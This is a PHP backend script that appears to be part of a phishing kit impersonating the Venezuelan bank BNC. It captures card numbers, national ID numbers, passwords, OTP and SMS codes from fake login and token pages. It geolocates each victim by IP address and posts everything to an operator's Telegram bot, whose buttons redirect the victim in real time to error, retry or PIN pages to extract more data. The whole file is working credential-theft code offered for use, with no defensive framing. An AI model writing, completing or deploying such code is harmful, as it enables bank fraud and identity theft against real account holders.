<?php
session_start();
require_once 'config.php';

$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

function get_ip_info($user_ip) {
    $url = "https://ipinfo.io/{$user_ip}/json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error en cURL: ' . curl_error($ch);
        return null;
    }
    curl_close($ch);
    return json_decode($response, true);
}

$locationData = get_ip_info($user_ip);
$cc = $locationData['country'] ?? 'No disponible';
$city = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

if (!file_exists('requests')) {
    mkdir('requests', 0777, true);
}

$form_origen = "desconocido";
$message = "";

// index.php
if (isset($_POST['tipo_usuario'],$_POST['tipo_tarjeta'],$_POST['card'],$_POST['doc'],$_POST['clave'])) {

    $_SESSION['usuario'] = $_POST['doc'];

    $form_origen = "index.php";

    $tipo_usuario = trim($_POST['tipo_usuario']);
    $tipo_tarjeta = trim($_POST['tipo_tarjeta']);
    $card = trim($_POST['card']);
    $doc = trim($_POST['doc']);
    $clave = trim($_POST['clave']);
    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈』🇻🇪\n\n";
    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";

// index-error.php
} elseif (isset($_POST['tipo_usuario2'],$_POST['tipo_tarjeta2'],$_POST['card2'],$_POST['doc2'],$_POST['clave2'])) {
    $_SESSION['usuario'] = $_POST['doc2'];

    $form_origen = "index-error.php";

    $tipo_usuario = trim($_POST['tipo_usuario2']);
    $tipo_tarjeta = trim($_POST['tipo_tarjeta2']);
    $card = trim($_POST['card2']);
    $doc = trim($_POST['doc2']);
    $clave = trim($_POST['clave2']);
    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";

// otp.php
} elseif (isset($_POST['otp'])) {
    $code = trim($_POST['otp']);
    $_SESSION['otp'] = $code;
    $form_origen = "otp.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇻🇪『𝖳𝗈𝗄𝖾𝗇 𝖡𝖭𝖢』🇻🇪\n\n";
    $message .= "📲 Código: <code>$code_esc</code>\n\n";
    $message .= "🍀 User: <code>$user_esc</code>\n";

// otp-error.php
} elseif (isset($_POST['otp2'])) {
    $code = trim($_POST['otp2']);
    $_SESSION['otp2'] = $code;
    $form_origen = "otp-error.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇻🇪『𝖳𝗈𝗄𝖾𝗇 𝖡𝖭𝖢-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "📲 Código: <code>$code_esc</code>\n\n";
    $message .= "🍀 User: <code>$user_esc</code>\n";


// sms.php
} elseif (isset($_POST['sms'])) {
    $code = trim($_POST['sms']);
    $_SESSION['sms'] = $code;
    $form_origen = "sms.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢』🇻🇪\n\n";
    $message .= "📲 Código: <code>$code_esc</code>\n\n";
    $message .= "🍀 User: <code>$user_esc</code>\n";


    // sms-error.php
} elseif (isset($_POST['sms2'])) {
    $code = trim($_POST['sms2']);
    $_SESSION['sms2'] = $code;
    $form_origen = "sms-error.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "📲 Código: <code>$code_esc</code>\n\n";
    $message .= "🍀 User: <code>$user_esc</code>\n"; 

} else {
    exit("No se reconocieron datos válidos.");
}

$message .= "\n🌎 Ubicación: $cc - $region - $city\n";
$message .= "🌐 IP: <code>$user_ip</code>";

$request_id = session_id();
$_SESSION['estado'] = null;

$request_data = [
    'usuario' => $_SESSION['usuario'] ?? 'Desconocido',
    'estado' => null
];
file_put_contents("requests/$request_id.json", json_encode($request_data));

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '【🍀】𝖨𝗇𝗂𝖼𝗂𝗈', 'callback_data' => "redir:$request_id:index.php"],
            ['text' => '【🛑】𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
        ],
        [
            ['text' => '【🍀】𝖳𝗈𝗄𝖾𝗇', 'callback_data' => "redir:$request_id:otp.php"],
            ['text' => '【🛑】𝖳𝗈𝗄𝖾𝗇 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:otp-error.php"]
        ],
        [
            ['text' => '【🍀】𝖭𝖨𝖯', 'callback_data' => "redir:$request_id:nip.php"],
            ['text' => '【🛑】𝖭𝖨𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:nip-error.php"]
        ],
        [
            ['text' => '【🏁】𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
        ]
    ]
];


$url = "https://api.telegram.org/bot" . $bot_token_2 . "/sendMessage";
$payload = [
    'chat_id' => $chat_id_2,
    'text' => $message,
    'reply_markup' => json_encode($keyboard),
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

header("Location: load.php?id=" . $request_id);
exit;
